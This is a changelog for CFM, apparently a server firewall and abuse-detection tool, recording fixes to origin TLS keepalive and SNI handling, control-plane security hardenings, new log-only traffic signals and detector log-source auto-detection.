# Changelog

All notable changes to CFM are recorded here.

**Versioning is date-based: the version *is* the release date** (`YYYY.MM.DD`,
from `date +%Y.%m.%d` in the Makefile). Each released `.deb`/`.rpm` produced by
`make release` carries that day's date, so every dated heading below
corresponds to a real package that was built and `make sync`'d out.

Format loosely follows [Keep a Changelog](https://keepachangelog.com/):
group entries under **Added / Changed / Fixed / Security / Removed**. Work in
progress accumulates under **[Unreleased]**; on release day it moves under a
new `## YYYY.MM.DD` heading (see CLAUDE.md → "Releasing & CHANGELOG").

History before this file (the first ~1000 PRs, Mar–Jun 2026) is not
back-filled here — see the git/PR history for that period.

## [Unreleased]

### Fixed
- **Origin keepalive (`ORIGIN_KEEPALIVE=1`) no longer causes Apache `421
  Misdirected Request` on shared-vhost HTTPS.** Routing allow-traffic through
  the shared `cfm_origin_https` named upstream let a backend TLS connection
  handshaked with `SNI=hostA` be reused for a request to `hostB` on the same
  origin IP — Apache answers `AH02032 … 421 Misdirected Request`. On one
  production box (OpenResty 1.31.1.1 → Apache) this produced ~17.5 k
  `status=421` over a week, on warm (`uct=0.000`) connections carrying the
  wrong SNI, across dozens of vhosts hitting real browsers and crawlers alike.
  Backend connection/TLS reuse can come from **three** independent layers, and
  the first was the trap that an audit for a `keepalive` *directive* misses:
  1. **nginx-core's native upstream keepalive — ON BY DEFAULT since nginx
     1.29.7** (this OpenResty ships nginx 1.31.1), `keepalive 32 local`, and
     **SNI-blind**: it reuses by peer IP:port and ignores SNI, and `local`
     separates pools only by *location*, not by `$host`. An earlier revision of
     this fix that only skipped the *Lua* balancer pool left this default-on
     native pool active and did **not** stop the 421s.
  2. the Lua balancer keepalive (`ngx.balancer.enable_keepalive`).
  3. `proxy_ssl_session_reuse` (default on) — the upstream SSL-session cache is
     peer-keyed, not SNI-keyed, so a resumed session can carry hostA's TLS
     identity into a hostB request.
  **Fix: HTTPS (port 443) is prohibited from reuse at every layer** — `keepalive
  0` on both `cfm_origin_*` upstreams in `openresty.conf` (disables the native
  pool), the Lua balancer never pools 443, and `proxy_ssl_session_reuse off` on
  every 443 origin location — so each 443 request is a fresh TCP + fresh TLS/SNI
  (`proxy_ssl_name $host`). Engine/version notes: the `keepalive 0` guard uses
  nginx **1.29.7+** disable semantics (older nginx/OpenResty rejects `keepalive
  0` and doesn't need it — native keepalive was off there), so this reference
  `openresty.conf` targets OpenResty shipping nginx ≥ 1.29.7; `angie.conf` omits
  `keepalive 0` entirely because Angie keeps native upstream keepalive off by
  default and does not document `0` as a disable (adding it risks an `angie -t`
  failure for no benefit). Port 80 stays pooled and is now the **only** pooled
  port (Lua-owned); the balancer's dispatch is fail-safe (`port == 80` pools,
  every other port defaults to unpooled), so a future origin port can't
  silently pool a TLS backend. Scope of the retained benefit: cfm.lua routes to
  the origin by the client's scheme, so HTTPS clients take the per-request 443
  path — the port-80 pool mainly helps plain-HTTP origin traffic (HTTP→HTTPS
  redirects, ACME/`.well-known` DCV, plain-HTTP sites); the bulk 443 handshake
  saving is given up until a **proven** SNI-keyed 443 pool lands (gated by a
  two-vhost same-IP integration test on the deployed engine, not a unit test).
  The knob is now safe to run fleet-wide; operators do **not** need to disable
  it. **Deploying this fix needs an edge reload** (`openresty -s reload` /
  `angie -s reload`): the balancer module is `require`d and `lua_code_cache`
  is on, so running workers keep the old code until fresh workers spawn —
  unlike toggling `ORIGIN_KEEPALIVE` itself, which the edge re-reads within
  ~10 s with no reload. To stop the 421s *immediately* without a reload, set
  `ORIGIN_KEEPALIVE = 0` (rolls back within ~10 s), then deploy + reload the
  code fix and re-enable. See `docs/proxy-performance.md`.
- **Origin keepalive activity is now visible in error.log.** The module's
  diagnostic messages were logged at `NOTICE`, but `error_log` runs at
  `warn`, so they were never written — operators grepping `[cfm_origin_ka]`
  after enabling saw nothing, the log blind spot that hid the 421 root cause
  for a week. Each worker now logs its effective state at `WARN` the first
  time it routes on each port: `[cfm_origin_ka] HTTP(80) origin pooling active`
  (or a degraded WARN when the engine lacks `enable_keepalive`) and
  `[cfm_origin_ka] origin port 443: per-request connection, never pooled …`.
  These are expected once-per-worker lines, not error conditions.

## 2026.08.26

### Security
- **Admin SSO cookie signing key is now a random per-node secret, not derived
  from `AUTH_TOKEN`.** The `cfm-embed-admin` cookie was HMAC-signed with a key
  HKDF-derived from `AUTH_TOKEN`, which made it **forgeable from a cfm-web
  database leak**: cfm-web holds every node's `AUTH_TOKEN`, so a leak let an
  attacker derive the (public-salt) key and mint a valid admin cookie, reaching
  full admin from any IP — bypassing the admin-token source-IP gate (which only
  covers the token branch). The key is now random, generated on the node,
  persisted `0600` root-only at `/var/lib/cfm/embed-admin-cookie.key`, and never
  sent to cfm-web — so a cfm-web DB leak can no longer forge an admin session
  cookie. No config: the key auto-generates on first use (mirrors the MCP-token /
  MFA-key persistence). **Effect on upgrade:** any open admin SSO session is
  invalidated once (a one-time re-login; the ~10-minute cookie TTL bounds it).
  Rotate/recover by deleting the key file and restarting `cfm`. This is the
  companion (part B) to the admin-token source-IP binding; it closes the
  cookie-forgery path that binding alone left open. Design:
  `docs/security/admin-token-source-ip-binding.md`.

### Security
- **Admin-token source-IP binding (`ADMIN_TOKEN_IP_BINDING`, default off) —
  part (A).** New opt-in gate on the admin `AUTH_TOKEN` auth branch: it can
  require the request's real source IP (via `requestPeer().ClientIP`, correct
  behind the loopback edge hop) to be **loopback ∪ this host's own IPs ∪
  `cfm.allow`/`cfm.dyndns` ∪ the `API_URL` host**, so a leaked admin token
  **cannot be replayed from a foreign IP against the direct API or SSO-code
  minting** even if the firewall is off — a fail-safe that lives in the API
  itself. The admin token is only ever presented server-to-server (cfm-web at the
  `API_URL` host) or over loopback (the WHM plugin), so this leaves the browser
  SSO, session and scoped-token paths untouched. Modes: `off` (default —
  behaviour unchanged), `logonly` (burn-in: logs `admin_token_source_ip
  logonly=would_block …`, still allows), `enforce` (403 + `blocked_source_ip`
  audit + an `ADMIN_TOKEN_FOREIGN_IP` anomaly so a single foreign-IP use alerts).
  The resolved mode is logged at startup, and an unrecognized value warns instead
  of silently disabling. Reuses the (previously unwired) `ip_allow_middleware`
  allowlist helpers. Recommended rollout: `enforce` on one node, confirm SSO + API
  still work (loopback + `API_URL` host are always allowed, so you cannot lock
  yourself out), then fleet-wide.
  **Scope — (A) alone does NOT fully neutralize a leaked `AUTH_TOKEN`:** the
  embed-admin **cookie** is signed with a key derived from `AUTH_TOKEN`, so a leak
  can still **forge** it and reach full admin from any IP until the companion
  **(B)** lands (decouple the cookie signing key from `AUTH_TOKEN`); and `/mcp`
  accepts the admin token for **read-only** telemetry, unaffected by this gate
  (fix: a dedicated `MCP_TOKEN`). Enable `enforce` for defence-in-depth, not as a
  complete leaked-token containment. Design, live evidence and the full threat
  map: `docs/security/admin-token-source-ip-binding.md`.

### Added
- **Admin SSO bootstrap for the admin UI** (`/api/v1/embed/admin-code` +
  `/api/v1/embed/admin-bootstrap`). A caller that already holds the node's admin
  credential (the cfm-web fleet controller's "Login" button, or the root WHM
  plugin) can mint a one-time code and hand an operator a one-click login into
  `/cfm-admin/` — no re-typing that node's password + MFA. Mirrors the scoped
  cPanel embed flow but mints a **full-admin** browser session: the code
  endpoint is non-public and rejects any non-admin role, the code is 160-bit,
  single-use and 45s-lived, and it sets a short-lived (10 min, rolling-renewed),
  HMAC-signed, host+UA-bound `cfm-embed-admin` cookie scoped to `/cfm-admin/`
  (SameSite=Lax; domain-separated signing key from the scoped embed cookie).
  Grants nothing the admin-token holder did not already have. Design:
  `docs/security/admin-sso-bootstrap.md`.
- **WHM plugin: direct login into the admin UI.** Opening CFM from WHM now mints
  an admin SSO code against the local daemon and lands root **already
  authenticated** in `/cfm-admin/`, instead of the bare redirect that showed the
  login page whenever no admin session existed. The WHM CGI runs as root, so it
  reads `AUTH_TOKEN` from the `cfm.api.conf` overlay (`cfm_admin_token()` now
  checks the overlay, not just base `cfm.conf`). Falls back to the previous plain
  redirect if the mint is unavailable (older daemon / unreadable token) — no
  regression.

### Changed
- **cPanel/WHM plugin code now refreshes on package upgrade.** When cPanel is
  present and the plugin is already installed, the deb/rpm post-install refreshes
  only the plugin **code** files (`bootstrap.php`, `cfm_api.php`, the two CGIs and
  the template) in place, so plugin fixes (e.g. the WHM direct-login change) ride
  a normal `apt`/`yum` upgrade instead of requiring a manual re-install. It never
  installs the plugin where it was not already present and deliberately does **not**
  `register_appconfig` / `install_plugin` / restart `cpsrvd` — first-time install
  (and any appconfig/icon change) still goes through
  `plugins/cfm-plugin-cpanel/install.sh`.

## 2026.08.25

### Added
- **`cfm webtop live` TUI now surfaces the abuse_shadow signals.** The live
  dashboard gains a compact **SIG** column in the top vhost table — a fixed-slot
  `f`/`c`/`d`/`s` presence cell for facet (query-cardinality), cost (5xx origin
  pressure), dc (unverified-datacenter fraction) and the rate-outlier shadow
  count — so an operator can see at a glance which vhosts are lighting up which
  signal. The `x`-toggle bottom panel is broadened from "Suspicious" to
  **"Suspicious + Challenged"**: it now merges the challenged vhosts (auto/manual,
  with a CH column) into the suspicious list, and gives the signals their **own
  `SIGNALS` column** (`farm` / `facet=N` / `cost=N%` / `dc=N%` / `shadow=N` as
  words) — the same unified "who needs attention and why" view cfm-admin already
  shows (cfm-admin and `cfm webtop challenge` already carry these badges). Pure
  visibility of already-collected data — no enforcement, no new signals.
- **cfm-admin: a "what the signal pills mean" legend** above the WebTop and
  Suspicious+Challenged tables — a collapsible toolbox explaining each shadow
  signal (`farm`/`shadow`/`facet`/`cost`/`dc`) in plain language, so an operator
  no longer has to hover each pill's tooltip to learn what it is. Defined once and
  shared by both cards.
- **`abuse_shadow` MCP tool: per-vhost breakdowns for the three vhost-level
  signals** — `top_facet` (hosts by URL/path expansion), `top_cost` (by 5xx
  fraction) and `top_dc` (by unverified-datacenter fraction), each ranked by its
  own peak metric. Answers "which vhosts is facet/cost/dc actually flagging?"
  during burn-in, alongside the existing Signal-C rate-outlier view. Read-only
  aggregation over the same log; no new data collected.

### Changed
- **`cfm webtop live` bottom panel: signals moved out of REASONS into their own
  `SIGNALS` column.** Appending the signal tokens to REASONS (the initial
  approach) let the score reasons push them past truncation, so the signal words
  were often invisible; a dedicated column keeps them legible and de-clutters
  REASONS. Ordered before REASONS so a narrow terminal squeezes REASONS, not the
  signals.

### Fixed
- **`abuse_shadow` aggregation no longer counts dc_fraction's operational lines.**
  The dc_fraction signal writes two verdict-less bookkeeping lines to the shadow
  log (a `verified_crawler=… excluded` FCrDNS note and a `deferred_vhosts=…`
  budget line); the aggregator was counting them as events, inflating `total` and
  `unique_ips` (with a malformed `ip=…)` from the note — ironically the very
  verified-crawler IPs the signal excludes) and adding a junk empty-key row to the
  `by_verdict` split. The aggregator now counts only real decision lines (those
  carrying a `verdict=`). Per-signal top lists also now report each host's single
  strongest firing (not a per-field max stitched across windows) and rank
  deterministically on ties.

### Changed
- **`cfm webtop live` bottom panel: signals moved out of REASONS into their own
  `SIGNALS` column.** Appending the signal tokens to REASONS (the initial
  approach) let the score reasons push them past truncation, so the signal words
  were often invisible; a dedicated column keeps them legible and de-clutters
  REASONS. Ordered before REASONS so a narrow terminal squeezes REASONS, not the
  signals.

### Fixed
- **`abuse_shadow` aggregation no longer counts dc_fraction's operational lines.**
  The dc_fraction signal writes two verdict-less bookkeeping lines to the shadow
  log (a `verified_crawler=… excluded` FCrDNS note and a `deferred_vhosts=…`
  budget line); the aggregator was counting them as events, inflating `total` and
  `unique_ips` (with a malformed `ip=…)` from the note — ironically the very
  verified-crawler IPs the signal excludes) and adding a junk empty-key row to the
  `by_verdict` split. The aggregator now counts only real decision lines (those
  carrying a `verdict=`). Per-signal top lists also now report each host's single
  strongest firing (not a per-field max stitched across windows) and rank
  deterministically on ties.

### Added
- **abuse_shadow datacenter-fraction signal (Signal H): vhost-level cloud-ASN
  share, verified-gated, log-only.** Records what fraction of a vhost's requests
  come from datacenter/cloud ASNs that are NOT verified good bots — a
  corroborating feature for cloud-hosted scraper / proxy floods. **Verified-gated:**
  FCrDNS-verified crawlers (Google/Meta/Bing…) are datacenter but legitimate and
  are excluded from the suspicious count, so a heavily-crawled shop does not read
  as ~100% datacenter. Origin is never innocence: this is a FEATURE only —
  datacenter-ASN alone NEVER drives an adverse decision, and nothing here
  challenges or blocks. It stamps a per-vhost `dc_fraction` badge (`dc N%` pill in
  cfm-admin, `dc=N%` in `cfm webtop challenge`) and writes a `signal=dc_fraction`
  line to `cfm.abuse_shadow.log`. Cost-bounded per CLAUDE.md §6: ASN class is a
  cheap inline mmdb lookup (no DNS) under a per-tick IP budget that defers (and
  logs — no silent cap) the overflow, while never skipping a single vhost so large
  it can't fit a full budget (the biggest floods stay visible); the good-bot
  exclusion goes through a shared FCrDNS verdict cache, so a verified crawler is a
  DNS-free cache hit and only a cache miss kicks a bounded, deduped, async
  forward-confirm — a stable crawler is confirmed once per TTL, not every tick, and
  the verdict outlives geo-cache eviction. Residual log-only limitation, honestly
  documented: an IP whose good-bot verdict is still cold (mainly the first ticks
  after a daemon restart) counts as datacenter until the async confirm lands
  (~2–3 ticks), so a freshly-restarted heavily-crawled shop can briefly over-read
  — counting the unknown is deliberate (a real cloud flood is mostly generic/absent
  PTR IPs that "exclude-on-unknown" would blind the signal to), and it must be
  closed before Signal H feeds any enforcement. Gated under the `ABUSE_SHADOW`
  master, default-ON with it;
  tunable via `ABUSE_SHADOW_DCFRAC`, `ABUSE_SHADOW_DCFRAC_MIN_FRAC` (0.5),
  `ABUSE_SHADOW_DCFRAC_MIN_REQ` (50) and `ABUSE_SHADOW_DCFRAC_MIN_IPS` (5, a
  spread of datacenter IPs, not one chatty host). Phase 1 of the
  traffic-classifier plan (`docs/traffic-classifier.md`); no score contribution
  and no enforcement yet.
- **abuse_shadow cost-pressure signal (Signal G): vhost-level origin 5xx
  pressure, log-only.** Where facet (Signal F) sees the request-shape *cause* of
  a flood, Signal G sees its *symptom* — the origin buckling (the 256k×500
  collapse). It flags a vhost whose 5xx fraction is high under real request
  volume AND whose absolute 5xx rate clears a floor (so a tiny idle vhost with a
  single 500 does not read as "under pressure"). It NEVER challenges or blocks:
  it stamps a per-vhost `cost_pressure` badge (the 5xx percent — `cost N%` pill
  in cfm-admin, `cost=N%` flag in `cfm webtop challenge`) and writes one
  structured `signal=cost_pressure` line per flagged vhost to the shared
  `cfm.abuse_shadow.log` (with the average response time as a second, non-gating
  cost dimension). Reuses the per-bucket 5xx counters the engine already
  maintains, so there is **no ingest cost** — only a cheap per-tick aggregation.
  Gated under the `ABUSE_SHADOW` master and default-ON with it (no config edit to
  start collecting); tunable via `ABUSE_SHADOW_COST`,
  `ABUSE_SHADOW_COST_MIN_FRAC` (0.15), `ABUSE_SHADOW_COST_MIN_REQ` (50) and
  `ABUSE_SHADOW_COST_MIN_RPS5XX` (1.0). Phase 1 of the traffic-classifier plan
  (`docs/traffic-classifier.md`); no score contribution and no enforcement yet.
- **abuse_shadow facet signal (Signal F): vhost-level query-cardinality
  visibility, log-only.** Surfaces the one traffic shape `path_diversity` is
  structurally blind to. `path_diversity` counts distinct BASE paths / total, so
  a faceted-URL flood — few base paths, an enormous distinct-query fan-out (the
  observed e-athlos shape: ~805k `?filter_category=…` URLs riding on 2 base
  paths) — collapses to `unique_paths≈2` and reads as the most benign vhost on
  the board. Signal F counts distinct FULL URLs (path+query) per vhost and flags
  one whose distinct-URL count is large AND dwarfs its distinct base-path count
  (facet expansion). It NEVER challenges or blocks: it stamps a per-vhost badge
  (new `query_cardinality` field on webtop/suspicious/challenge rows, a `facet`
  pill in cfm-admin, a `facet=N` flag in `cfm webtop challenge`) and writes one
  structured `signal=facet_expansion` line per flagged vhost to the existing
  `cfm.abuse_shadow.log` (no new log file). Gated under the `ABUSE_SHADOW`
  master and default-ON with it, so a node already running `ABUSE_SHADOW = 1`
  starts collecting on upgrade with no config edit; tunable via
  `ABUSE_SHADOW_FACET`, `ABUSE_SHADOW_FACET_MIN_URLS` (300),
  `ABUSE_SHADOW_FACET_MIN_EXPANSION` (20) and `ABUSE_SHADOW_FACET_CAP` (3000,
  per-bucket memory bound). Distinct URLs, distinct base paths and the request
  total are all measured over ONE universe — dynamic requests with static assets
  excluded — so the expansion ratio means the same thing on every vhost (a
  static-heavy vhost cannot dilute its own denominator and silently raise its
  effective threshold). Zero hot-path cost when the master is off (nil maps, no
  hashing); when it is on, the cost is up to two `hash64` per dynamic request (the
  URL and its base path) plus a bounded per-eval snapshot, and each active vhost
  holds two capped hash-sets per sliding-window bucket. Phase 1 of the
  traffic-classifier plan
  (`docs/traffic-classifier.md`); no score contribution and no enforcement yet.
- **`/etc/cfm/detectors.d/` overlay layer — the base `detectors.conf` becomes
  pristine and package-updateable again.** The daemon now reads the base
  conffile and merges every `detectors.d/*.conf` over it in lexicographic
  order: same key replaces, new `KEY += value` syntax appends to list keys
  (`IGNORE_NETS += …`) and stacks multiline rule blocks, overlay-only sections
  are added whole, and hot reload watches overlays like the base — including
  files added, removed, or renamed (the reload signature hashes the overlay
  set, so `cp -p`/`rsync -a` installs with old mtimes still trigger). Put
  deliberate per-host overrides there (e.g. `10-mysql.conf`, `20-ssh.conf`)
  and upgrades update the base file in place — ending the
  `.rpmnew`/`.dpkg-dist` drift (design: docs/detectors-config-unification.md
  §4). Packages ship the directory empty and never install files into it. The
  source-resolution preview (CLI/API/card/MCP), `cfm status` probes and `cfm
  test` report the merged view; `config_drift` computes missing sections/keys
  against the merged view (a feature adopted via an overlay stops being
  reported missing) while value diffs stay stock-vs-BASE, with overlays
  summarized separately (per-file section/key counts); the cfm-admin editor
  still edits the base and shows a notice when overlays exist (overlay
  editing from the UI is a follow-up). Only real, regular `*.conf` files are
  read — hidden files, symlinks of any kind, directories and other special
  entries are ignored (one stray entry never drops the other overlays). A
  regular `*.conf` overlay that fails to read or parse is a logged error, never
  silently applied half-merged: a hot reload keeps the current detectors, and a
  daemon start falls back to the base config only (builtin-only mode stays
  reserved for the base file itself being unreadable). The auto-managed tokens
  `CHALLENGE_TOKEN`/`OPENRESTY_TOKEN` are base-owned and NOT overridable via an
  overlay (they are generated into, and read from, the base — avoiding a
  rotate-every-reload loop and keeping `cfm_bridge_token.lua` in lockstep).
  Effective-config probes read through the same layered reader, so `cfm status`,
  `cfm health` and `whats_wrong` never disagree with the running daemon.
### Security
- **Session-cookie `Secure` is now automatic from the effective request scheme (audit
  Step 6); `AUTH_SECURE_COOKIE` deprecated.** The goauth session cookie (`cfm-sid`) is
  always `Secure`, and a new `SessionCookieTransportMiddleware` translates it on the
  wire to a **distinct** non-Secure `cfm-sid-http-fallback` cookie **only** in the
  TLS-down degraded plaintext `:6060` window (the sole place a session is written over
  real cleartext, since a healthy `:6060` redirects browser admin to `:6061`). One
  goauth session store is shared — the translation is per-request on the wire, so there
  is **no manager-global cookie mutation and no race**. A browser holding `cfm-sid;
  Secure` never sends it over http, so that Secure cookie is never downgraded or
  overwritten. The effective scheme is spoof-safe (`X-Forwarded-Proto` is trusted only
  from a loopback edge peer), so a direct `:6060` client cannot forge a Secure cookie.
  `AUTH_SECURE_COOKIE` is now **parsed but ignored** with a one-time startup deprecation
  warning when present. See `docs/security/session-cookie-transport.md`.
- **The direct TLS admin port `:6061` now always completes a handshake via a
  self-signed fallback.** Previously `sslcollector`'s `GetCertificate` returned an
  error when it had discovered no certificate yet (fresh system) or when a client
  connected by IP with no SNI (`https://<ip>:6061`) — the handshake aborted. Combined
  with the R01/Step 5 behaviour (a healthy `:6060` redirects browser admin to `:6061`
  and refuses plaintext login), that could lock an operator out of a fresh box. CFM
  now serves its own lazily-generated, cached self-signed certificate whenever the
  real cert path has nothing to offer, so `:6061` still completes a handshake (the
  browser warns and the operator clicks through). It is edge-independent (no
  OpenResty/Angie or `/cfm-admin` required) and the apiserver pairs it with no HSTS,
  so a by-IP client (`https://<ip>:6061` — the primary lockout scenario; IP literals
  are exempt from HSTS) can always click through; a by-hostname client can too unless
  that hostname was HSTS-pinned by another path on the host. A real discovered cert is
  always preferred and used unchanged. This fallback is a trust-on-first-use
  break-glass path — like an SSH first-connect or an appliance's first-boot cert it is
  MITM-able by an active attacker, so install a real certificate promptly; it is not a
  steady state.

### Changed
- **Explicit `JOURNAL_UNIT` pins are now alias-normalized to the canonical
  systemd unit on the srcresolve-adopted detectors** (`ssh_auth`,
  `dovecot_auth`, `postfix_security`/`postfix_relays`). Live-fleet finding: a
  config pinning `JOURNAL_UNIT = sshd.service` dropped onto a Debian host
  tails an EMPTY journal forever — `sshd.service` is an `Alias=` of
  `ssh.service` there and journald indexes only the canonical name (verified:
  `journalctl -u sshd.service` → "No entries" while `ssh.service` carries the
  real sshd log). The resolver now canonicalizes explicit units via
  `systemctl show -p Id` — same service, corrected name, operator intent
  preserved; unknown units and non-systemd hosts keep the given name
  verbatim, and detectors still on their own tailing (`ftpd`, `proxmox_auth`,
  `custom`) are unchanged until they migrate. The resolution log/report shows
  the rewrite (`explicit JOURNAL_UNIT sshd.service → canonical ssh.service`).
  Registers also now share one memoized probe set per registration sweep, so
  resolving many sections repeats no identical systemctl/journalctl/docker
  exec.
- **`cfm detectors-srcresolve` now joins daemon coverage into one table.** New
  DAEMON column per section (watched unit active/stopped/absent, from
  `/api/v1/detectors/coverage`), extra `<type> (not in config)` rows for GAP
  (a daemon RUNS here but nothing watches it — the forgotten-ftp case) and
  dormant verdicts, and a trailing ok/GAP/dormant/disabled/absent summary —
  one command answering "does the daemon exist, did I detect it, am I
  following it". `--json` returns the combined document; a coverage fetch
  failure degrades the column to `?` instead of failing the command.

### Security
- **Control-plane API rate limiting, enforcing by default (audit Step 8).** The
  authenticated `:6060`/`:6061` API is now bounded per **identity** (admin token /
  scoped token / session / embed) × **route class** (cheap/normal/heavy read, write,
  privileged write, capture/stream), keyed by a non-secret subject so one scoped
  token cannot drain another's bucket. Ceilings are **honestly high** and baked into
  code — a "secure fleet" upgrade protects with no `cfm.conf` change — so only genuine
  runaway (orders of magnitude above real fan-out) trips them. A trip is a self-healing
  `429` + `Retry-After` and is logged to `cfm.api.log` (`event=ratelimit_trip`);
  crucially it is **never** turned into an nft block of the caller's IP (the admin
  token is the fleet controller). Optional knobs `RATE_LIMIT_MODE`
  (`enforce`/`shadow`/`off`) and `RATE_LIMIT_SCALE` tune without a code change; invalid
  credentials still get the normal `401` before the limiter, so limiter behaviour never
  leaks credential validity. See `docs/security/control-plane-rate-limiting.md`.
- **`/api/v1/http3/{enable,disable}` now emit `Allow: POST` on a rejected non-POST
  request (audit R03 consistency).** The two HTTP/3 opt-in mutators already rejected
  non-POST with `405`, but via a handler-local method check that omitted the `Allow`
  header — diverging from the shared `requirePOST` wrapper every other control-plane
  mutator uses. They now go through `requirePOST` (same method-before-auth ordering, so
  no behaviour change beyond the added header), the divergent local checks are removed,
  and both routes join the `TestMutatorsRejectNonPOST`/`AllowPOST` regression set. No
  functional change for POST callers.
- **`AdminTransportRedirect` now tracks a non-default `PORT` (audit R01 / Step 5 follow-up).**
  `requestPeer`'s listener classification keyed on hardcoded `6060`/`6061`, so running the
  control plane on a non-default `PORT`/`TLS_PORT` classified every request as `other` and
  silently disabled the direct-`:6060`→`:6061` transport guard. It now records the actual
  configured listener ports at startup and classifies against them (falling back to
  `6060`/`6061` when unset), so the guard works on any port. No effect on default-port installs.

### Fixed
- **Mailcow boot race no longer silently kills postfix/dovecot monitoring.** When
  CFM started before the mailcow docker stack was up, the postfix/dovecot detectors
  resolved provisionally (tailing an empty host `/var/log/mail.log`) and — because a
  container appearing changes no config file — never re-resolved, so brute-force/relay/
  queue monitoring stayed silently dead until the next daemon restart. The manager now
  schedules a bounded re-resolution (every 60s, up to 5 min) for the SPECIFIC case where
  the docker CLI is present but the expected mail container was not found yet, so the
  container's appearance is picked up automatically. The retry is deliberately narrow
  (not every provisional default — a host with postfix installed-but-unconfirmed, or any
  non-docker default, has no container coming and is left alone) and gentle, so a
  non-mail docker host pays only a few boot-time rebuilds before it stops for good. Stale
  references to a non-existent `cfm detector reload` in comments/notes were corrected
  (recovery is automatic, or on restart).
- **`cfm detectors-srcresolve` / the source-resolution preview** no longer mislabels
  `custom` and `proxmox_auth` sections as "n/a (command/API/collector-based)" — both tail
  a log source and are now shown with their own resolution note.
- **`/api/v1/detectors/source-resolution` reclassified to the heavy-read rate bucket.**
  Each call forks `journalctl`/`systemctl`/`docker ps`/`stat`; it was bucketed with cheap
  JSON reads, so a fan-out loop could pile up subprocesses on a wedged host.

### Added
- **Source-resolution preview across all four surfaces: `cfm
  detectors-srcresolve` (alias `detectors-resolve`), `GET
  /api/v1/detectors/source-resolution`, a cfm-admin "Source resolution" card,
  and the `detectors_srcresolve` MCP tool.** A dry run of the shared detector
  source resolver: per detectors.conf section, which journald unit / log file
  / docker container it would tail on this host RIGHT NOW and why — including
  provisional (blind default, self-heals) and would-self-disable (MTA absent)
  verdicts, plus the configured source keys. The registers and the report run
  the SAME planner functions (`internal/detectors/source_report.go`), so the
  preview cannot drift from what the daemon actually does. Built for the
  fleet-unification rollout: check every node (MCP fan-out via cfm-web) before
  removing hand-set `MODE`/`LOG_PATH`/`JOURNAL_UNIT`/`DOCKER_CONTAINER` pins.
  Read-only; probes run, nothing starts or changes.

### Changed
- **The exim/postfix detectors now auto-detect their log source and self-disable
  without their MTA.** `postfix_security`/`postfix_relays` gain `MODE = auto`
  on the shared resolver: journald units chosen by a postfix *signature* check
  (recent entries must carry the `postfix/...[pid]:` tag — journald attributes
  by cgroup, so mere entry existence can be another service's lines) → docker
  container discovery (mailcow) → `/var/log/maillog`/`mail.log`.
  `exim_security`/`exim_relays` auto-resolve `LOG_PATH` from the standard
  mainlog locations — with **no journald candidates at all**: exim writes its
  own mainlog and never syslogs it, so `journalctl -u exim` carries only stray
  child-process output (live fleet evidence: dovecot LDA lines attributed to
  exim.service). All six mail sections (incl. both `*_queues`) self-disable
  cleanly when their MTA is absent — postfix sections check binary/unit/
  discovered container/log and stay alive provisionally when the docker CLI
  exists but no container answered yet (a slow dockerd at boot cannot
  permanently disable them; the cfm unit is now also ordered after
  docker.service), exim sections check binary/unit (+ mainlog) — so
  postfix-only and exim-only boxes no longer need hand-set `ENABLED=0`; and
  `postfix_queues` auto-wraps its queue commands in `docker exec` when postfix
  lives only in a discovered container. Explicit
  `MODE`/`LOG_PATH`/`JOURNAL_UNIT`/`JOURNAL_MATCHES`/`DOCKER_CONTAINER`/
  `TOTAL_CMD`/`LIST_CMD` keep working unchanged and always win.
- **`ssh_auth` / `dovecot_auth` now auto-detect their log source (`MODE = auto`).**
  The new shared resolver (`internal/detectors/srcresolve`) tries journald
  units with entries → active units (alias-resolved to the canonical name) →
  (dovecot) docker container discovery → known log files, so one
  `detectors.conf` works across EL/cPanel, Debian/DirectAdmin and mailcow
  hosts without hand-set `MODE`/`LOG_PATH`/`JOURNAL_UNIT`. Explicit values
  keep working and win (a pinned `MODE=journal` unit now additionally falls
  back to the mail-log file where journalctl cannot run at all, as dovecot
  already did). Fixes the silent no-op ssh detector on Debian for configs that
  omit the source keys — journald does not resolve the `sshd.service` alias,
  so auto picks `ssh.service`; live configs that PIN `JOURNAL_UNIT =
  sshd.service` keep their explicit value and need the pin dropped (see
  `docs/detectors-config-unification.md` migration). Dovecot alerts now report
  the source actually tailed after a fallback. When nothing is confirmed the
  detector tails its historical default provisionally (self-heals when the
  source appears) and logs the full resolution trace.

### Security
- **Direct plaintext `:6060` control plane hardened (audit R01), defence in depth.**
  (1) The plaintext `:6060` listener is now **loopback-only by default**: an unset
  `LISTEN_ADDRESS` binds `127.0.0.1` in code (not the wildcard), and the reference
  `cfm.conf` sets it explicitly. The OpenResty/Angie edge and the `cfm` CLI both reach
  `:6060` over loopback, so nothing legitimate changes and there is no Internet-reachable
  plaintext admin plane by default; an explicit `LISTEN_ADDRESS = "0.0.0.0"` stays the
  opt-in escape hatch. *Existing installs that were on `0.0.0.0` should set
  `LISTEN_ADDRESS = "127.0.0.1"` in `/etc/cfm/cfm.conf` — and, because `:6061` inherits
  `LISTEN_ADDRESS` when `TLS_LISTEN_ADDRESS` is unset, also set `TLS_LISTEN_ADDRESS =
  "0.0.0.0"` so the TLS admin plane stays remotely reachable* (the reference `cfm.conf`
  already sets it). (2) A new **pre-auth `AdminTransportRedirect`** safety net: if `:6060`
  is deliberately re-exposed, a direct external browser `GET`/`HEAD` of an admin route is
  `302`-upgraded to the TLS port `:6061` (only once the TLS listener has actually bound),
  and a state-changing plaintext admin request is refused with `403` rather than processed
  — so credentials are never handled over cleartext, and a redirect never re-sends a
  leaked body. The edge backend hop, the `:6061` listener, the loopback CLI, and machine
  `/api/v1` traffic are all untouched (machine-API R01 closure rests on the loopback bind
  above, not this middleware). Writes are refused regardless of TLS state, so a genuine
  TLS-down state serves only a logged (`event=admin_http_fallback`) **read-only** degraded
  fallback (GET/HEAD) — challenge-gating that read window is tracked for audit Step 4. See
  `docs/security/direct-6060-transport-policy.md`.
- **Direct control-plane security/cache response headers (audit R10, Step 9).** The direct
  `:6060`/`:6061` listeners now carry their own baseline headers instead of relying on the
  edge: a new `SecurityHeadersMiddleware` sets `X-Content-Type-Options: nosniff` and
  `Referrer-Policy: strict-origin-when-cross-origin` on **every** response (closing the gap
  where direct `/login` HTML had neither), and anonymous/invalid `401`s from the auth layer
  now carry `Cache-Control: no-store` + `Vary` so a rejected identity response can't be
  cached as another. `Referrer-Policy` is intentionally the browser default rather than
  `no-referrer`, which would strip the same-origin `Referer` that CSRF falls back to.
  Frame/CSP policy (must stay compatible with the cPanel iframe embed) and HSTS (host-wide,
  would strand the supported plaintext `:6060`) are **deliberately deferred** — see
  `docs/security/control-plane-headers.md`.

### Added
- **`abuse_shadow` rate-outlier count surfaced per vhost (webtop / API / cfm-admin).**
